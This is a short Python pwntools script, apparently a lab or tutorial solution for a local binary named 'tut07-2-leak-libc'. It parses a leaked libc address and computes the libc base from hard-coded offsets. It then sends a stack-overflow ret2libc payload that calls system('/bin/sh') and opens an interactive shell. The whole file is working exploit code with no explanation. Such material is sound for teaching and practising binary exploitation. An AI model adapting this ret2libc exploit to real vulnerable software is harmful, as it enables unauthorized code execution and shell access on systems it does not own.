# $1 = 0x214a0

from pwn import *

p = process(['/home/lab07/tut07-2-leak-libc/target'], env={})

print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())

address_libc_start_call_main_121 = int( p.recvline().split(b"] ")[-1], 16 )
print(hex(address_libc_start_call_main_121))

offset_libc_start_call_main = 0x214a0

addr_libc_base = address_libc_start_call_main_121 - 121 - offset_libc_start_call_main
print(hex(addr_libc_base))

offset_system = 0x48170
addr_system = addr_libc_base + offset_system

offset_binsh = 0x1bd0d5
addr_binsh = addr_libc_base + offset_binsh

payload = cyclic(cyclic_find(0x63616171))
payload += p32(addr_system)
payload += b"A" * 4
payload += p32(addr_binsh)

p.sendline(payload)
p.interactive()

# 0x48170